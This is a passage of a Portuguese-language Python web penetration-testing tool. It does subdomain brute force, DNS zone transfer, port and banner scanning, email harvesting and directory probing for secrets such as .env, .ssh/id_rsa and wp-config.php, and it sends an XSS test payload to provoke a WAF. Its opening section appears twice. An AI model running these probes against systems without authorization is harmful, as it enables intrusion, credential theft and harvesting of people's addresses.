"""
CYBERFORCE WEB PENTEST SUITE v3.0 - Ferramenta Profissional de Cibersegurança Web
Autor: Para fins educacionais e testes éticos
Licença: Uso apenas em sistemas que você possui ou tem autorização explícita
"""

import asyncio
import aiohttp
import socket
import ssl
import json
import hashlib
import base64
import re
import os
import sys
import time
import logging
import threading
import queue
import random
import string
import urllib3
import xml.etree.ElementTree as ET
from urllib.parse import urlparse, urljoin, quote, unquote, parse_qs
from datetime import datetime
from typing import List, Dict, Set, Optional, Tuple, Any
import dns.resolver
import dns.zone
import dns.query
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import csv
import sqlite3
import ipaddress
import whois
import tldextract
from colorama import init, Fore, Style, Back
import paramiko
import ftplib
import smtplib
from cryptography import x509
from cryptography.hazmat.backends import default_backend
import jwt
import pickle
import yaml
import subprocess

# Desativa warnings SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== CLASSE PRINCIPAL ====================

class AdvancedWebPentestSuite:
    """Suite avançada de testes de penetração web"""
    
    def __init__(self, target_url, output_dir="pentest_reports"):
        """Inicializa a suite de pentest"""
        # Inicializa colorama
        init(autoreset=True)
        
        # Configuração básica
        self.target_url = target_url
        self.parsed_url = urlparse(target_url)
        self.base_domain = self.parsed_url.netloc
        self.output_dir = output_dir
        
        # Cria estrutura de diretórios
        os.makedirs(f"{output_dir}/scans", exist_ok=True)
        os.makedirs(f"{output_dir}/loot", exist_ok=True)
        os.makedirs(f"{output_dir}/reports", exist_ok=True)
        
        # Configuração de logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(f"{output_dir}/pentest.log"),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        
        # Session HTTP com configurações
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Armazena vulnerabilidades encontradas
        self.vulnerabilities = []
        
        # Wordlists
        self.wordlists = {
            'subdomains': None,  # Será definido dinamicamente
            'directories': [
                'admin', 'administrator', 'login', 'panel', 'dashboard',
                'wp-admin', 'wp-content', 'wp-includes', 'backup', 'backups',
                'config', 'conf', 'cfg', 'database', 'db', 'sql',
                'phpmyadmin', 'mysql', 'test', 'dev', 'development',
                'api', 'v1', 'v2', 'assets', 'static', 'uploads', 'files',
                'includes', 'inc', 'lib', 'libs', 'src', 'source',
                'css', 'js', 'javascript', 'images', 'img', 'fonts',
                'tmp', 'temp', 'cache', 'logs', 'log'
            ],
            'files': [
                'robots.txt', 'sitemap.xml', '.htaccess', '.env',
                'config.php', 'config.inc.php', 'database.php',
                'phpinfo.php', 'info.php', 'test.php',
                'readme.md', 'readme.txt', 'changelog.txt',
                'backup.sql', 'database.sql', 'dump.sql',
                '.git/config', '.git/HEAD', '.ssh/id_rsa',
                'wp-config.php', 'web.config', 'settings.py'
            ]
        }
        
        # Verifica disponibilidade do Nmap
        try:
            import nmap
            self.nm = nmap.PortScanner()
            self.nmap_available = True
        except:
            self.nmap_available = False
            self.logger.warning("Nmap não disponível, usando scanner básico")
        
        self.logger.info(f"Suite inicializada para {target_url}")
    
    # ==================== MÓDULO DE RECONHECIMENTO ====================
    
    def advanced_reconnaissance(self):
        """Reconhecimento avançado completo"""
        print(f"\n{Fore.YELLOW}[*] Iniciando reconhecimento avançado{Style.RESET_ALL}")
        
        # Subdomain enumeration
        print(f"{Fore.CYAN}[*] Enumerando subdomínios...{Style.RESET_ALL}")
        subdomains = self.enumerate_subdomains()
        
        # DNS enumeration
        print(f"{Fore.CYAN}[*] Realizando enumeração DNS...{Style.RESET_ALL}")
        dns_info = self.dns_enumeration()
        
        # Port scanning
        print(f"{Fore.CYAN}[*] Escaneando portas...{Style.RESET_ALL}")
        ports = self.advanced_port_scan()
        
        # Technology fingerprinting
        print(f"{Fore.CYAN}[*] Identificando tecnologias...{Style.RESET_ALL}")
        tech = self.technology_fingerprinting()
        
        # SSL/TLS check
        if self.parsed_url.scheme == 'https':
            print(f"{Fore.CYAN}[*] Verificando certificado SSL...{Style.RESET_ALL}")
            ssl_info = self.check_ssl_certificate()
        
        # Security headers
        print(f"{Fore.CYAN}[*] Analisando headers de segurança...{Style.RESET_ALL}")
"""
CYBERFORCE WEB PENTEST SUITE v3.0 - Ferramenta Profissional de Cibersegurança Web
Autor: Para fins educacionais e testes éticos
Licença: Uso apenas em sistemas que você possui ou tem autorização explícita
"""

import asyncio
import aiohttp
import socket
import ssl
import json
import hashlib
import base64
import re
import os
import sys
import time
import logging
import threading
import queue
import random
import string
import urllib3
import xml.etree.ElementTree as ET
from urllib.parse import urlparse, urljoin, quote, unquote, parse_qs
from datetime import datetime
from typing import List, Dict, Set, Optional, Tuple, Any
import dns.resolver
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
import csv
import sqlite3
import ipaddress
import whois
import tldextract
from colorama import init, Fore, Style, Back
import paramiko
import ftplib
import smtplib
from cryptography import x509
from cryptography.hazmat.backends import default_backend
import jwt
import pickle
import yaml
import subprocess

# Desativa warnings SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== CLASSE PRINCIPAL ====================

class AdvancedWebPentestSuite:
    """Suite avançada de testes de penetração web"""
    
    def __init__(self, target_url, output_dir="pentest_reports"):
        """Inicializa a suite de pentest"""
        # Inicializa colorama
        init(autoreset=True)
        
        # Configuração básica
        self.target_url = target_url
        self.parsed_url = urlparse(target_url)
        self.base_domain = self.parsed_url.netloc
        self.output_dir = output_dir
        
        # Cria estrutura de diretórios
        os.makedirs(f"{output_dir}/scans", exist_ok=True)
        os.makedirs(f"{output_dir}/loot", exist_ok=True)
        os.makedirs(f"{output_dir}/reports", exist_ok=True)
        
        # Configuração de logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(f"{output_dir}/pentest.log"),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        
        # Session HTTP com configurações
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Armazena vulnerabilidades encontradas
        self.vulnerabilities = []
        self.discovered_subdomains = set()
        self.discovered_files = set()
        # Persistence for vulnerabilities
        self.vuln_ids = set()
        self.db_path = f"{output_dir}/scans/vulns.db"
        self._init_db()
        
        # Wordlists
        self.wordlists = {
            'subdomains': None,  # Será definido dinamicamente
            'directories': [
                'admin', 'administrator', 'login', 'panel', 'dashboard',
                'wp-admin', 'wp-content', 'wp-includes', 'backup', 'backups',
                'config', 'conf', 'cfg', 'database', 'db', 'sql',
                'phpmyadmin', 'mysql', 'test', 'dev', 'development',
                'api', 'v1', 'v2', 'assets', 'static', 'uploads', 'files',
                'includes', 'inc', 'lib', 'libs', 'src', 'source',
                'css', 'js', 'javascript', 'images', 'img', 'fonts',
                'tmp', 'temp', 'cache', 'logs', 'log'
            ],
            'files': [
                'robots.txt', 'sitemap.xml', '.htaccess', '.env',
                'config.php', 'config.inc.php', 'database.php',
                'phpinfo.php', 'info.php', 'test.php',
                'readme.md', 'readme.txt', 'changelog.txt',
                'backup.sql', 'database.sql', 'dump.sql',
                '.git/config', '.git/HEAD', '.ssh/id_rsa',
                'wp-config.php', 'web.config', 'settings.py'
            ]
        }
        
        # Verifica disponibilidade do Nmap
        try:
            import nmap
            self.nm = nmap.PortScanner()
            self.nmap_available = True
        except:
            self.nmap_available = False
            self.logger.warning("Nmap não disponível, usando scanner básico")
        
        self.logger.info(f"Suite inicializada para {target_url}")
        # Tenta habilitar Playwright para render JS (opcional)
        try:
            from playwright.sync_api import sync_playwright
            self.playwright_available = True
        except Exception:
            self.playwright_available = False
    
    # ==================== MÓDULO DE RECONHECIMENTO ====================
    
    def get_website_info(self):
        """Coleta informações básicas do site"""
        info = {
            'url': self.target_url,
            'server': 'Unknown',
            'technologies': [],
            'status_code': 0
        }
        
        try:
            response = self.session.get(self.target_url, timeout=10, verify=False)
            info['status_code'] = response.status_code
            info['server'] = response.headers.get('Server', 'Unknown')
            info['technologies'] = self.detect_technologies(response)
        except Exception as e:
            self.logger.error(f"Erro ao obter informações do site: {e}")
            
        return info
    
    def advanced_reconnaissance(self):
        """Reconhecimento avançado completo"""
        print(f"\n{Fore.YELLOW}[*] Iniciando reconhecimento avançado{Style.RESET_ALL}")
        
        # Subdomain enumeration
        print(f"{Fore.CYAN}[*] Enumerando subdomínios...{Style.RESET_ALL}")
        subdomains = self.enumerate_subdomains()
        
        # DNS enumeration
        print(f"{Fore.CYAN}[*] Realizando enumeração DNS...{Style.RESET_ALL}")
        dns_info = self.dns_enumeration()
        
        # Port scanning
        print(f"{Fore.CYAN}[*] Escaneando portas...{Style.RESET_ALL}")
        ports = self.advanced_port_scan()
        
        # Technology fingerprinting
        print(f"{Fore.CYAN}[*] Identificando tecnologias...{Style.RESET_ALL}")
        tech = self.technology_fingerprinting()
        
        # SSL/TLS check
        if self.parsed_url.scheme == 'https':
            print(f"{Fore.CYAN}[*] Verificando certificado SSL...{Style.RESET_ALL}")
            ssl_info = self.check_ssl_certificate()
        
        # Security headers
        print(f"{Fore.CYAN}[*] Analisando headers de segurança...{Style.RESET_ALL}")
        headers = self.check_security_headers()
        
        # WHOIS lookup
        print(f"{Fore.CYAN}[*] Consultando WHOIS...{Style.RESET_ALL}")
        whois_info = self.whois_lookup()
        
        # Crawling
        print(f"{Fore.CYAN}[*] Crawling do site...{Style.RESET_ALL}")
        links = self.crawl_website()

        # WAF Detection
        print(f"{Fore.CYAN}[*] Verificando WAF...{Style.RESET_ALL}")
        waf_info = self.check_waf()

        # Email Harvesting
        print(f"{Fore.CYAN}[*] Coletando emails...{Style.RESET_ALL}")
        emails = self.harvest_emails()
        
        print(f"{Fore.GREEN}[+] Reconhecimento concluído!{Style.RESET_ALL}")
        
        return {
            'subdomains': subdomains,
            'dns_info': dns_info,
            'ports': ports,
            'technologies': tech,
            'security_headers': headers,
            'whois': whois_info,
            'links': links,
            'waf': waf_info,
            'emails': emails
        }
    
    def enumerate_subdomains(self):
        """Enumeração de subdomínios"""
        found = set()
        
        # Bruteforce DNS
        print(f"{Fore.YELLOW}[*] Bruteforce DNS...{Style.RESET_ALL}")
        bruteforce_subs = self.bruteforce_subdomains()
        found.update(bruteforce_subs)
        
        # Certificate Transparency
        print(f"{Fore.YELLOW}[*] Consultando Certificate Transparency logs...{Style.RESET_ALL}")
        crtsh_subs = self.crtsh_subdomains()
        found.update(crtsh_subs)
        
        # Zone transfer
        print(f"{Fore.YELLOW}[*] Tentando transferência de zona DNS...{Style.RESET_ALL}")
        zone_subs = self.dns_zone_transfer()
        found.update(zone_subs)
        
        return found
    
    def bruteforce_subdomains(self):
        """Bruteforce de subdomínios"""
        found = set()
        domain = self.base_domain.split(':')[0]
        
        wordlist = self.wordlists['subdomains'] or [
            'www', 'mail', 'ftp', 'admin', 'test', 'dev', 'staging',
            'api', 'blog', 'shop', 'store', 'panel', 'cpanel', 'webmail',
            'secure', 'vpn', 'mx', 'ns1', 'ns2', 'dns', 'static',
            'cdn', 'img', 'images', 'assets', 'media', 'video',
            'app', 'apps', 'mobile', 'm', 'wap',
            'beta', 'alpha', 'demo', 'stage', 'prod',
            'server', 'servers', 'host', 'hosting',
            'cloud', 'storage', 'files', 'upload',
            'db', 'database', 'sql', 'mysql',
            'redis', 'memcached', 'elasticsearch',
            'monitor', 'monitoring', 'stats', 'statistics',
            'auth', 'authentication', 'login', 'signin',
            'payment', 'pay', 'checkout', 'cart',
            'support', 'help', 'faq', 'knowledgebase',
            'wiki', 'documentation', 'docs',
            'forum', 'forums', 'community',
            'news', 'blog', 'articles', 'posts'
        ]
        
        def check_subdomain(sub):
            try:
                # Verifica DNS
                resolver = dns.resolver.Resolver()
                resolver.timeout = 2
                resolver.lifetime = 2
                
                full_domain = f"{sub}.{domain}"
                answers = resolver.resolve(full_domain, 'A')
                if answers:
                    return full_domain
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = {executor.submit(check_subdomain, sub): sub for sub in wordlist}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found.add(result)
        
        return found
    
    def dns_zone_transfer(self):
        """Tenta realizar transferência de zona DNS (AXFR)"""
        found = set()
        domain = self.base_domain.split(':')[0]
        try:
            ns_answers = dns.resolver.resolve(domain, 'NS')
            for ns in ns_answers:
                ns_target = str(ns.target)
                try:
                    ns_ip = dns.resolver.resolve(ns_target, 'A')[0].address
                    zone = dns.zone.from_xfr(dns.query.xfr(ns_ip, domain, timeout=5))
                    if zone:
                        for name, node in zone.nodes.items():
                            sub = str(name) + '.' + domain
                            found.add(sub)
                except:
                    continue
        except:
            pass
        return found

    def crtsh_subdomains(self):
        """Busca subdomínios via Certificate Transparency"""
        found = set()
        domain = self.base_domain.split(':')[0]
        
        try:
            url = f"https://crt.sh/?q=%.{domain}&output=json"
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                for entry in data:
                    name_value = entry.get('name_value', '')
                    if name_value:
                        if '\n' in name_value:
                            names = name_value.split('\n')
                            for name in names:
                                if domain in name and '*' not in name:
                                    found.add(name.strip())
                        else:
                            if domain in name_value and '*' not in name_value:
                                found.add(name_value.strip())
            else:
                # Fallback para versão HTML
                url = f"https://crt.sh/?q={domain}"
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    # Extrai subdomínios do HTML
                    pattern = r'>([a-zA-Z0-9.*_-]+\.' + re.escape(domain) + r')<'
                    matches = re.findall(pattern, response.text)
                    for match in matches:
                        if '*' not in match:
                            found.add(match)
        except Exception as e:
            self.logger.debug(f"crt.sh não disponível: {e}")
        
        return found
    
    def advanced_port_scan(self):
        """Scanner de portas avançado"""
        if self.nmap_available:
            return self.nmap_port_scan()
        else:
            return self.basic_port_scan()
    
    def nmap_port_scan(self):
        """Scanner de portas usando Nmap"""
        open_ports = []
        domain = self.base_domain.split(':')[0]
        
        try:
            # Scanner rápido
            self.nm.scan(domain, arguments='-T4 -F')
            
            if domain in self.nm.all_hosts():
                for proto in self.nm[domain].all_protocols():
                    ports = self.nm[domain][proto].keys()
                    for port in ports:
                        state = self.nm[domain][proto][port]['state']
                        if state == 'open':
                            service = self.nm[domain][proto][port]['name']
                            version = self.nm[domain][proto][port].get('version', '')
                            open_ports.append({
                                'port': port,
                                'protocol': proto,
                                'service': service,
                                'version': version,
                                'state': state
                            })
        
        except Exception as e:
            self.logger.error(f"Erro no Nmap scan: {e}")
            open_ports = self.basic_port_scan()
        
        self.save_json(open_ports, 'open_ports.json')
        print(f"{Fore.GREEN}[+] Port scan completo. {len(open_ports)} portas abertas{Style.RESET_ALL}")
        
        return open_ports
    
    def basic_port_scan(self):
        """Scanner básico de portas"""
        open_ports = []
        domain = self.base_domain.split(':')[0]
        
        # Portas comuns para web e serviços relacionados
        common_ports = [
            21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443,
            445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 8888
        ]
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((domain, port))
                sock.close()
                if result == 0:
                    # Tenta identificar o serviço
                    service = self.identify_service(domain, port)
                    return {
                        'port': port,
                        'protocol': 'tcp',
                        'service': service,
                        'state': 'open'
                    }
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = {executor.submit(scan_port, port): port for port in common_ports}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    open_ports.append(result)
        
        self.save_json(open_ports, 'open_ports.json')
        print(f"{Fore.GREEN}[+] Port scan básico completo. {len(open_ports)} portas abertas{Style.RESET_ALL}")
        
        return open_ports
    
    def identify_service(self, domain, port):
        """Tenta identificar o serviço rodando na porta"""
        service_map = {
            21: 'ftp',
            22: 'ssh',
            23: 'telnet',
            25: 'smtp',
            53: 'dns',
            80: 'http',
            110: 'pop3',
            143: 'imap',
            443: 'https',
            445: 'smb',
            3306: 'mysql',
            3389: 'rdp',
            8080: 'http-proxy',
            8443: 'https-alt',
            8888: 'http-alt'
        }
        
        # Verifica banners
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((domain, port))
            
            # Tenta receber banner
            sock.send(b'\r\n')
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            if banner:
                # Analisa banner para identificar serviço
                if 'SSH' in banner.upper():
                    return 'ssh'
                elif 'FTP' in banner.upper():
                    return 'ftp'
                elif 'SMTP' in banner.upper():
                    return 'smtp'
                elif 'HTTP' in banner.upper():
                    return 'http'
                elif 'MYSQL' in banner:
                    return 'mysql'
        
        except:
            pass
        
        # Retorna mapeamento padrão ou unknown
        return service_map.get(port, 'unknown')
    
    def dns_enumeration(self):
        """Enumeração DNS avançada"""
        dns_info = {}
        domain = self.base_domain.split(':')[0]
        
        try:
            resolver = dns.resolver.Resolver()
            resolver.timeout = 5
            resolver.lifetime = 5
            
            # Tipos de registros para consultar
            record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']
            
            for record_type in record_types:
                try:
                    answers = resolver.resolve(domain, record_type)
                    dns_info[record_type] = [str(r) for r in answers]
                except Exception as e:
                    dns_info[record_type] = f"Error: {e}"
            
            # DNS reverso para IPs
            try:
                a_records = dns_info.get('A', [])
                for ip in a_records:
                    try:
                        rev_name = socket.gethostbyaddr(ip)
                        dns_info.setdefault('PTR', {})[ip] = rev_name[0]
                    except:
                        dns_info.setdefault('PTR', {})[ip] = 'No PTR record'
            except:
                pass
            
            self.save_json(dns_info, 'dns_info.json')
            print(f"{Fore.GREEN}[+] Enumeração DNS concluída{Style.RESET_ALL}")
            
        except Exception as e:
            self.logger.error(f"Erro na enumeração DNS: {e}")
        
        return dns_info
    
    def whois_lookup(self):
        """Consulta WHOIS"""
        try:
            domain = self.base_domain.split(':')[0]
            w = whois.whois(domain)
            
            whois_info = {
                'domain_name': w.domain_name,
                'registrar': w.registrar,
                'creation_date': str(w.creation_date),
                'expiration_date': str(w.expiration_date),
                'name_servers': w.name_servers,
                'emails': w.emails,
                'org': w.org,
                'country': w.country
            }
            
            self.save_json(whois_info, 'whois_info.json')
            print(f"{Fore.GREEN}[+] WHOIS lookup concluído{Style.RESET_ALL}")
            
            return whois_info
        except Exception as e:
            self.logger.error(f"Erro no WHOIS: {e}")
            return None
    
    def technology_fingerprinting(self):
        """Fingerprinting avançado de tecnologias"""
        technologies = {}
        
        try:
            response = self.session.get(self.target_url, timeout=10, verify=False)
            
            # Wappalyzer-like detection
            tech_patterns = {
                'Web Servers': {
                    'Apache': [r'Apache[/\s](\d+\.\d+(\.\d+)?)', 'Server: Apache'],
                    'Nginx': [r'nginx[/\s](\d+\.\d+(\.\d+)?)', 'Server: nginx'],
                    'IIS': [r'Microsoft-IIS[/\s](\d+\.\d+)', 'Server: Microsoft-IIS'],
                    'LiteSpeed': [r'LiteSpeed', 'Server: LiteSpeed'],
                    'Tomcat': [r'Apache-Coyote', 'Server: Apache-Coyote']
                },
                'Programming Languages': {
                    'PHP': [r'PHP[/\s](\d+\.\d+(\.\d+)?)', 'X-Powered-By: PHP'],
                    'ASP.NET': [r'ASP\.NET', r'X-Powered-By: ASP\.NET'],
                    'Java': [r'JSP', 'JSESSIONID'],
                    'Python': [r'Python', 'WSGIServer'],
                    'Ruby': [r'Ruby', 'Rails', 'WEBrick'],
                    'Node.js': [r'Node\.js', 'Express']
                },
                'Frameworks': {
                    'WordPress': [r'wp-content', 'wp-includes', 'WordPress'],
                    'Joomla': [r'joomla', 'Joomla!'],
                    'Drupal': [r'Drupal', 'drupal'],
                    'Laravel': [r'laravel', 'Laravel'],
                    'React': [r'React', 'react-dom'],
                    'Angular': [r'Angular', 'ng-'],
                    'Vue.js': [r'Vue\.js', 'vue'],
                    'Bootstrap': [r'bootstrap', 'Bootstrap']
                },
                'Databases': {
                    'MySQL': [r'MySQL', 'mysql'],
                    'PostgreSQL': [r'PostgreSQL', 'postgres'],
                    'MongoDB': [r'MongoDB', 'mongodb'],
                    'Redis': [r'redis', 'Redis']
                },
                'CDN': {
                    'Cloudflare': [r'cloudflare', 'CF-Ray'],
                    'Akamai': [r'Akamai', 'X-Akamai'],
                    'CloudFront': [r'CloudFront', 'X-Amz-Cf-Id']
                }
            }
            
            headers_text = '\n'.join([f'{k}: {v}' for k, v in response.headers.items()])
            full_text = headers_text + '\n' + response.text[:5000]
            
            for category, techs in tech_patterns.items():
                for tech, patterns in techs.items():
                    for pattern in patterns:
                        if re.search(pattern, full_text, re.IGNORECASE):
                            technologies.setdefault(category, set()).add(tech)
                            break
            
            # Converte sets para lists
            for category in technologies:
                technologies[category] = list(technologies[category])
            
            self.save_json(technologies, 'technologies.json')
            print(f"{Fore.GREEN}[+] Fingerprinting concluído: {len(technologies)} categorias encontradas{Style.RESET_ALL}")
            
        except Exception as e:
            self.logger.error(f"Erro no fingerprinting: {e}")
        
        return technologies
    
    def check_ssl_certificate(self):
        """Verifica certificado SSL/TLS"""
        try:
            domain = self.parsed_url.netloc
            if ':' in domain:
                domain = domain.split(':')[0]
            
            context = ssl.create_default_context()
            with socket.create_connection((domain, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert(binary_form=False)
                    
                    cert_info = {
                        'subject': dict(x[0] for x in cert['subject']),
                        'issuer': dict(x[0] for x in cert['issuer']),
                        'version': cert.get('version'),
                        'serialNumber': cert.get('serialNumber'),
                        'notBefore': cert.get('notBefore'),
                        'notAfter': cert.get('notAfter'),
                        'subjectAltName': cert.get('subjectAltName', []),
                        'OCSP': cert.get('OCSP', []),
                        'caIssuers': cert.get('caIssuers', []),
                        'crlDistributionPoints': cert.get('crlDistributionPoints', [])
                    }
                    
                    # Verifica validade
                    from datetime import datetime
                    not_after = datetime.strptime(cert_info['notAfter'], '%b %d %H:%M:%S %Y %Z')
                    days_remaining = (not_after - datetime.now()).days
                    
                    cert_info['days_remaining'] = days_remaining
                    cert_info['is_valid'] = days_remaining > 0
                    
                    # Verifica configurações comuns
                    cert_info['checks'] = {
                        'expired': days_remaining <= 0,
                        'expiring_soon': 0 < days_remaining <= 30,
                        'has_wildcard': any('*' in alt for alt in cert_info.get('subjectAltName', []) if isinstance(alt, str))
                    }
                    
                    self.save_json(cert_info, 'ssl_certificate.json')
                    print(f"{Fore.GREEN}[+] Certificado SSL analisado{Style.RESET_ALL}")
                    
                    return cert_info
        except Exception as e:
            self.logger.error(f"Erro ao verificar SSL: {e}")
            return None
    
    def check_security_headers(self):
        """Verifica headers de segurança"""
        try:
            response = self.session.get(self.target_url, timeout=10, verify=False)
            
            security_headers = {
                'Strict-Transport-Security': response.headers.get('Strict-Transport-Security'),
                'Content-Security-Policy': response.headers.get('Content-Security-Policy'),
                'X-Frame-Options': response.headers.get('X-Frame-Options'),
                'X-Content-Type-Options': response.headers.get('X-Content-Type-Options'),
                'Referrer-Policy': response.headers.get('Referrer-Policy'),
                'Permissions-Policy': response.headers.get('Permissions-Policy'),
                'X-XSS-Protection': response.headers.get('X-XSS-Protection'),
                'Cross-Origin-Opener-Policy': response.headers.get('Cross-Origin-Opener-Policy'),
                'Cross-Origin-Resource-Policy': response.headers.get('Cross-Origin-Resource-Policy'),
                'Cross-Origin-Embedder-Policy': response.headers.get('Cross-Origin-Embedder-Policy')
            }
            
            # Análise de segurança
            missing_headers = []
            for header, value in security_headers.items():
                if not value:
                    missing_headers.append(header)
            
            analysis = {
                'headers_present': security_headers,
                'missing_headers': missing_headers,
                'score': round((len([h for h in security_headers.values() if h]) / len(security_headers)) * 100, 2)
            }
            
            self.save_json(analysis, 'security_headers.json')
            print(f"{Fore.GREEN}[+] Headers de segurança analisados - Score: {analysis['score']}%{Style.RESET_ALL}")
            
            return analysis
        except Exception as e:
            self.logger.error(f"Erro ao verificar headers: {e}")
            return None
    
    def crawl_website(self, max_pages=50):
        """Crawling básico do website"""
        visited = set()
        to_visit = {self.target_url}
        all_links = set()
        
        try:
            while to_visit and len(visited) < max_pages:
                url = to_visit.pop()
                
                if url in visited:
                    continue
                
                try:
                    response = self.session.get(url, timeout=5, verify=False, allow_redirects=True)
                    visited.add(url)
                    
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Extrai todos os links
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        full_url = urljoin(url, href)
                        
                        if self.base_domain in full_url and full_url not in visited:
                            to_visit.add(full_url)
                            all_links.add(full_url)
                    
                    # Extrai formulários
                    forms = self.extract_forms(response.text)
                    for form in forms:
                        form_url = urljoin(url, form['action'])
                        if form_url not in visited:
                            all_links.add(form_url)
                    
                    time.sleep(0.1)  # Rate limiting
                    
                except Exception as e:
                    self.logger.debug(f"Erro ao acessar {url}: {e}")
            
            self.save_list(list(all_links), 'crawled_links.txt')
            print(f"{Fore.GREEN}[+] Crawling concluído: {len(visited)} páginas visitadas, {len(all_links)} links coletados{Style.RESET_ALL}")
            
            return list(all_links)
            
        except Exception as e:
            self.logger.error(f"Erro no crawling: {e}")
            return []

    def check_waf(self):
        """Detecta presença de WAF (Web Application Firewall)"""
        waf_signatures = {
            'Cloudflare': ['cf-ray', '__cfduid', 'cloudflare'],
            'AWS WAF': ['x-amzn-requestid', 'aws'],
            'Akamai': ['akamai', 'x-akamai'],
            'Imperva': ['x-iinfo', 'incap_ses', 'visid_incap'],
            'F5 BIG-IP': ['bigip', 'bigipserver', 'f5'],
            'Sucuri': ['sucuri', 'x-sucuri'],
            'Barracuda': ['barra', 'bni_persistence'],
            'ModSecurity': ['mod_security', 'modsecurity']
        }
        
        detected_wafs = []
        try:
            # Check headers
            response = self.session.get(self.target_url, timeout=10, verify=False)
            headers = {k.lower(): v.lower() for k, v in response.headers.items()}
            
            for waf, sigs in waf_signatures.items():
                for sig in sigs:
                    if any(sig in h for h in headers) or any(sig in v for v in headers.values()):
                        detected_wafs.append(waf)
                        break
            
            # Active check (provoke WAF)
            payload_url = f"{self.target_url}?test=<script>alert(1)</script>"
            try:
                response_block = self.session.get(payload_url, timeout=10, verify=False)
                if response_block.status_code in [403, 406, 501]:
                    if not detected_wafs:
                        detected_wafs.append("Generic WAF (Blocked Malicious Request)")
            except:
                pass
            
            detected_wafs = list(set(detected_wafs))
            
            if detected_wafs:
                print(f"{Fore.YELLOW}[!] WAF Detectado: {', '.join(detected_wafs)}{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}[+] Nenhum WAF detectado{Style.RESET_ALL}")
            
            self.save_json(detected_wafs, 'waf_detection.json')
            return detected_wafs
            
        except Exception as e:
            self.logger.error(f"Erro na detecção de WAF: {e}")
            return []

    def harvest_emails(self):
        """Coleta endereços de email das páginas visitadas"""
        emails = set()
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        
        # Lê links crawleados se existirem, senão faz um crawl rápido
        crawled_file = f"{self.output_dir}/loot/crawled_links.txt"
        urls_to_scan = []
        
        if os.path.exists(crawled_file):
            with open(crawled_file, 'r') as f:
                urls_to_scan = [line.strip() for line in f.readlines()]
        else:
            urls_to_scan = [self.target_url]
            
        def scan_url_for_emails(url):
            try:
                response = self.session.get(url, timeout=5, verify=False)
                found = re.findall(email_pattern, response.text)
                return found
            except:
                return []
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(scan_url_for_emails, url): url for url in urls_to_scan[:50]} # Limit to 50 pages
            for future in as_completed(futures):
                found = future.result()
                if found:
                    emails.update(found)
        
        # Filter out common false positives
        filtered_emails = {e for e in emails if not any(x in e.lower() for x in ['.png', '.jpg', '.gif', '.css', '.js', 'example.com', 'domain.com'])}
        
        if filtered_emails:
            print(f"{Fore.GREEN}[+] {len(filtered_emails)} emails encontrados{Style.RESET_ALL}")
            self.save_list(list(filtered_emails), 'emails.txt')
        else:
            print(f"{Fore.YELLOW}[!] Nenhum email encontrado{Style.RESET_ALL}")
            
        return list(filtered_emails)
    
    # ==================== MÓDULO DE ENUMERAÇÃO DE DIRETÓRIOS ====================
    
    def directory_enumeration(self):
        """Enumeração avançada de diretórios"""
        print(f"{Fore.YELLOW}[*] Iniciando enumeração de diretórios{Style.RESET_ALL}")
        
        found_dirs = set()
        found_files = set()
        
        # Wordlist de diretórios
        dir_wordlist = self.wordlists['directories']
        file_wordlist = self.wordlists['files']
        
        # Extensões comuns
        extensions = ['', '.php', '.html', '.htm', '.asp', '.aspx', '.jsp', 
                     '.txt', '.json', '.xml', '.yml', '.yaml']
        
        def check_path(path):
            url = f"{self.target_url}/{path}"
            try:
                response = self.session.get(url, timeout=3, verify=False, allow_redirects=False)
                
                status = response.status_code
                if status == 200:
                    content_len = len(response.content)
                    return ('file', path, content_len) if '.' in path else ('dir', path, content_len)
                elif status == 403:
                    return ('forbidden', path, 0)
                elif status in [301, 302]:
                    return ('redirect', path, 0)
                elif status == 401:
                    return ('unauthorized', path, 0)
                
            except Exception as e:
                return ('error', path, 0)
        
        # Testa diretórios
        all_paths = []
        for directory in dir_wordlist:
            all_paths.append(directory)
            for ext in extensions:
                all_paths.append(f"{directory}{ext}")
        
        for file in file_wordlist:
            all_paths.append(file)
        
        results = []
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(check_path, path): path for path in all_paths[:1000]}  # Limite
            
            for future in as_completed(futures):
                result = future.result()
                if result:
